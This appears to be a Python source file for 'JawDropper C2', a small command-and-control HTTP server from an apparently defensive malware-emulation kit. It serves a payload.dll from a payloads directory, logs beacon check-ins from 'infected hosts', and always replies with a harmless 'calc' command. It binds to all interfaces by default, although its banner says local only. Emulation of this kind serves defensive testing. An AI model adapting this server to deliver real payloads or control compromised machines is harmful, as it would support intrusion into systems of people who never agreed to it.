#!/usr/bin/env python3
"""
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This code replicates documented malware behavior for defensive security
testing and endpoint telemetry validation. It does NOT contain real malware
payloads, exploits, or evasion techniques.

LEGAL: Only run this in environments you own or have explicit written
authorization to test. Unauthorized use may violate computer fraud laws.

C2: Local network only (runs on your development machine)
============================================================================

JawDropper C2 Server

A simple HTTP server that:
1. Serves payload files from the payloads/ directory
2. Logs beacon check-ins from infected hosts
3. Provides a status page showing recent beacons

Usage:
    python3 server.py --port 8888

For simple payload delivery, you can also just use:
    cd jawdropper && python3 -m http.server 8888

This custom server adds beacon logging for video recording purposes.
"""

import argparse
import json
import os
import sys
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse

# Store recent beacons for status page
recent_beacons = []
MAX_BEACONS = 100


def timestamp():
    """Return formatted timestamp for logging."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(message):
    """Print timestamped log message."""
    print(f"[{timestamp()}] {message}")


class C2Handler(SimpleHTTPRequestHandler):
    """
    Custom HTTP handler for JawDropper C2 server.

    Endpoints:
        GET  /                      - Status page with recent beacons
        GET  /payloads/<file>       - Serve payload files
        POST /beacon                - Receive beacon check-ins
    """

    def __init__(self, *args, serve_directory=None, **kwargs):
        self.serve_directory = serve_directory
        super().__init__(*args, **kwargs)

    def translate_path(self, path):
        """Override to serve from custom directory."""
        if self.serve_directory:
            # Get the relative path after the URL
            parsed = urlparse(path)
            rel_path = parsed.path.lstrip('/')
            return os.path.join(self.serve_directory, rel_path)
        return super().translate_path(path)

    def do_GET(self):
        """Handle GET requests."""
        parsed = urlparse(self.path)
        path = parsed.path

        if path == '/':
            # Status page
            self.send_status_page()
        elif path.startswith('/payloads/'):
            # Serve payload file and log it
            filename = os.path.basename(path)
            log(f"PAYLOAD REQUEST → {filename}")

            # Call parent to serve the file
            super().do_GET()

            # Get file size for logging
            try:
                full_path = self.translate_path(path)
                if os.path.exists(full_path):
                    size_kb = os.path.getsize(full_path) / 1024
                    log(f"PAYLOAD DELIVERED → {filename} ({size_kb:.0f} KB)")
            except Exception:
                pass
        else:
            # Serve other files normally
            super().do_GET()

    def do_POST(self):
        """Handle POST requests (beacon check-ins)."""
        parsed = urlparse(self.path)
        path = parsed.path

        if path == '/beacon':
            self.handle_beacon()
        else:
            self.send_error(404, "Not Found")

    def handle_beacon(self):
        """Process beacon check-in from infected host."""
        try:
            # Read request body
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)

            # Parse JSON payload
            try:
                data = json.loads(body.decode('utf-8'))
            except json.JSONDecodeError:
                data = {"raw": body.decode('utf-8', errors='replace')}

            # Extract beacon info
            hostname = data.get('hostname', 'UNKNOWN')
            pid = data.get('pid', 'N/A')
            stage = data.get('stage', 'unknown')

            # Log the beacon (camera-friendly format)
            log(f"BEACON from {hostname} (PID: {pid}) - Stage: {stage}")

            # Store for status page
            beacon_record = {
                'timestamp': timestamp(),
                'hostname': hostname,
                'pid': pid,
                'stage': stage,
                'ip': self.client_address[0]
            }
            recent_beacons.insert(0, beacon_record)

            # Trim old beacons
            while len(recent_beacons) > MAX_BEACONS:
                recent_beacons.pop()

            # Send response
            response = json.dumps({
                "status": "ok",
                "command": "calc"  # Always safe payload
            })

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', len(response))
            self.end_headers()
            self.wfile.write(response.encode('utf-8'))

        except Exception as e:
            log(f"ERROR processing beacon: {e}")
            self.send_error(500, "Internal Server Error")

    def send_status_page(self):
        """Send HTML status page with recent beacons."""
        html = """<!DOCTYPE html>
<html>
<head>
    <title>JawDropper C2 - Status</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a2e;
            color: #eee;
            margin: 40px;
        }
        h1 { color: #e94560; }
        .warning {
            background: #e94560;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #333;
            padding: 10px;
            text-align: left;
        }
        th { background: #16213e; }
        tr:nth-child(even) { background: #16213e; }
        .beacon-count {
            font-size: 48px;
            color: #e94560;
            margin: 20px 0;
        }
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <h1>JawDropper C2 Server</h1>

    <div class="warning">
        <strong>ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY</strong><br>
        This is a local C2 server for defensive security testing.
    </div>

    <div class="beacon-count">""" + str(len(recent_beacons)) + """ beacons received</div>

    <h2>Recent Beacons</h2>
    <table>
        <tr>
            <th>Timestamp</th>
            <th>Hostname</th>
            <th>PID</th>
            <th>Stage</th>
            <th>Source IP</th>
        </tr>
"""
        for beacon in recent_beacons[:20]:  # Show last 20
            html += f"""        <tr>
            <td>{beacon['timestamp']}</td>
            <td>{beacon['hostname']}</td>
            <td>{beacon['pid']}</td>
            <td>{beacon['stage']}</td>
            <td>{beacon['ip']}</td>
        </tr>
"""

        html += """    </table>

    <p style="margin-top: 20px; color: #666;">
        Auto-refreshes every 5 seconds.
        Payload endpoint: <code>/payloads/payload.dll</code>
    </p>
</body>
</html>"""

        response = html.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)

    def log_message(self, format, *args):
        """Override to use our custom logging format."""
        # Suppress default logging for cleaner output
        pass


def main():
    parser = argparse.ArgumentParser(
        description='JawDropper C2 Server - Esinta Emulation',
        epilog='For simple payload delivery: python3 -m http.server 8888'
    )
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=8888,
        help='Port to listen on (default: 8888)'
    )
    parser.add_argument(
        '--serve-dir', '-d',
        type=str,
        default=None,
        help='Directory to serve files from (default: parent jawdropper/ directory)'
    )
    parser.add_argument(
        '--bind', '-b',
        type=str,
        default='0.0.0.0',
        help='Address to bind to (default: 0.0.0.0)'
    )

    args = parser.parse_args()

    # Determine serve directory
    if args.serve_dir:
        serve_dir = os.path.abspath(args.serve_dir)
    else:
        # Default: parent of c2-server directory (i.e., jawdropper/)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        serve_dir = os.path.dirname(script_dir)

    if not os.path.isdir(serve_dir):
        print(f"Error: Serve directory does not exist: {serve_dir}")
        sys.exit(1)

    # Create handler with serve directory
    def handler(*args, **kwargs):
        return C2Handler(*args, serve_directory=serve_dir, **kwargs)

    # Start server
    server = HTTPServer((args.bind, args.port), handler)

    print("=" * 70)
    print("ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 70)
    print()
    print("JawDropper C2 Server")
    print()
    print(f"  Listening:      http://{args.bind}:{args.port}")
    print(f"  Serving files:  {serve_dir}")
    print(f"  Status page:    http://localhost:{args.port}/")
    print(f"  Payload URL:    http://192.168.0.148:{args.port}/payloads/payload.dll")
    print()
    print("Waiting for connections... (Ctrl+C to stop)")
    print("-" * 70)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n" + "-" * 70)
        print(f"Shutting down. Total beacons received: {len(recent_beacons)}")
        server.shutdown()


if __name__ == '__main__':
    main()
